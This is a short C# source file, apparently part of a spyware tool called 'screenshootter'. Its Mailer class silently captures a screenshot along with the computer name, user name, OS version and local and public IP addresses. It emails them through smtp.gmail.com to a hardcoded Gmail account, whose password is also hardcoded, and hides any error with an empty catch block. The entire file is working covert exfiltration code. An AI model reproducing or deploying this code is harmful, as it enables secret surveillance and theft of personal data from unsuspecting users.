using System;
using System.Net;
using System.Net.Mail;
using Microsoft.VisualBasic.Devices;

namespace ConsoleApp1
{
    public static class Mailer
    {
        private const string Password = "screenshootter2017";
        private const string Login = "screenshootter@gmail.com";

        public static void SendMail()
        {
            try
            {
                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(Login, Password);
                MailMessage message = new MailMessage();
                message.To.Add("screenshootter@gmail.com");
                message.From = new MailAddress("screenshootter@gmail.com");
                message.Subject = "***SCREENSHOTTER***";
                message.Body = GetMailBody();
                message.Attachments.Add(ScreenShootService.GetScreenShotAttachment());
                client.Send(message);
            }
            catch (Exception)
            {
            }
        }

        private static string GetMailBody()
        {
            string userName = Environment.UserName;
            string computerMachineName = Environment.MachineName;
            string computerWindowsVersion = new ComputerInfo().OSFullName;
            string localIpAddress = Helper.GetLocalIPAddress();
            string publicIpAddress = Helper.GetPublicIPAddress();

            string body = $"Nazwa komputera: {computerMachineName}\r\n" +
                          $"Nazwa użytkownika: {userName}\r\n" +
                          $"Wersja systemu operacyjnego: {computerWindowsVersion}\r\n" +
                          $"Lokalny adres IP: {localIpAddress}\r\n" +
                          $"Publiczny adres IP: {publicIpAddress}";

            return body;
        }
    }
}
